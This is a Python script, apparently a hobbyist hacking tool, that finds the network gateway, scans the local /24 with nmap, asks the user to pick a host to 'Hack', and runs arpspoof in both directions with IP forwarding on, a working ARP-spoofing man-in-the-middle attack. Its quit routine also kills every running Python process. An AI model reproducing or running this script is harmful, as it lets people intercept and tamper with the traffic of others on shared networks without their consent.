import os
import time
import threading
import keyboard
print("Getting getaway address")
getawayparse = os.popen("route -n")
getawayparse = getawayparse.read()
valid = False
while valid != True:
   select = input("Interface:")
   if select in getawayparse:
          print("valid")
          valid = True
   else:
      print("Invalid")
          
place = getawayparse
place = place.split("\n")
for i in range(len(place)):
       if "UG" in place[i] and select in place[i]:
                   plasse = place[i]
                   gg1 = plasse.split("         ")
                   gg2 = gg1[1].split(" ")
                   plasse = gg2
                   print("Getaway: " + str(plasse[0]))
                   getaway = str(plasse[0])

  
def currenttip1(getaway):
     iplist = []
     parsed = getaway.split(".")
     for i in range(255):
            parsed[3] = i
            currentip = str(parsed[0]) + "." + str(parsed[1]) + "." + str(parsed[2]) + "." + str(parsed[3])
            iplist.append(currentip)
     return iplist
               
print(""" 
 ____________________________________ 
|  _    _  _       _                 |
| /_\  |  |_|      \  |/ |  | |  |   |   
|/   \ |  |       _/  |\ |__| |_ |_  | 
|____________________________________|                      
                                                      
         
""")
lists = currenttip1(getaway)
lists = lists
pingi = os.popen("nmap -sn " + getaway + "/24")
pingi = pingi.readlines()
alive = []
for line in pingi:
      if "report for" in line:
            grt = len(line) - 1
            parsing = line[21:grt]
            if "(" in parsing:
                   lklk = parsing.find("(")
                   lklk = lklk + 1
                   grt1 =  parsing.find(")")
                   alive.append(parsing[lklk:grt1])
                    
            else:
               alive.append(parsing)
for i in range(len(alive)):
       print(str(i) + ": " + alive[i])
attack = input("Hack:")
attack = int(attack)


def spoofer1(getaway, hackip):
      os.system("arpspoof -t " + getaway + " " + hackip + " >/dev/null 2>&1")

def spoofer2(getaway, hackip):
      os.system("arpspoof -t " + hackip + " " + getaway + " >/dev/null 2>&1")
      
if alive[attack]:
        print("""   
         press "q" to quit       
                                _____               _____   ____ 
         | |   | |     /\      / ____|   | | / /   |-----  |----- 
         | |   | |    /  \     | |       | |/ /    |_____  ||   ||
         | |___| |   / /\ \    | |       | | /     |-----  ||   ||
         | |___| |  / /__\ \   \ \___    | | \     |_____  ||___||
         | |   | | / /    \ \   \ ___|   | |\ \    |-----  |---- 
        """) 
        a1 = threading.Thread(target=spoofer1, args=(getaway, alive[attack]))
        a2 = threading.Thread(target=spoofer2, args=(getaway, alive[attack]))
        a1.start()
        a2.start()
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  
        while True:
              if keyboard.is_pressed("q"):
                         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                         print("Exitted")
                         os.system("pkill python3 && pkill python")
                        
                         exit()
                         
            
 
 
     
              

